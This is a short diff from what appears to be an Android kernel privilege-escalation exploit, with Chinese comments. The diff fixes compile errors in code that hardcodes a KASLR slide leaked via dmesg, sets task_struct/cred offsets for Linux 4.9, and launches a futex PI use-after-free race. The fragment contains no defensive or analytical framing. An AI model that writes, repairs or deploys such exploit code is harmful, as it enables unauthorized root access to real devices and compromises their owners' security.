@@ -33,12 +33,16 @@ int main(int argc, char **argv) {
     // 1. 注入你通过 dmesg (sar_power 告警) 算出的当前开机实时 KASLR Slide
     // 只要设备不重启，这个硬编码的值在内存中就是 100% 绝对准确的
     uint64_t my_hardcoded_slide = 0x1652000000; 
-    printf("[*] Bypassing Infoleak stage. Hardcoding Slide: 0x%llx\n", my_hardcoded_slide);
+    
+    // 【修正占位符】将 %llx 修改为 %lx，彻底消除 Android 64位 NDK 平台上的编译格式化警告
+    printf("[*] Bypassing Infoleak stage. Hardcoding Slide: 0x%lx\n", my_hardcoded_slide);
 
     // 2. 初始化为你 4.9.227 内核手动适配的 task_struct/cred 静态字段偏移
     // 强制截断针对高版本内核的 BTF 动态扫描，防止在 4.9 上发生段错误
     printf("[*] Initializing static struct layout offsets for Linux 4.9...\n");
-    populate_4_9_internal_offsets(); 
+    
+    // 【终极修复】显式带上命名空间限定符，根除 use of undeclared identifier 报错
+    ghostlock::kernel::populate_4_9_internal_offsets(); 
 
     // 3. 触发多线程竞争原语与任意内存读写覆写机制
     printf("[*] Launching multi-threaded futex PI UAF race attack...\n");
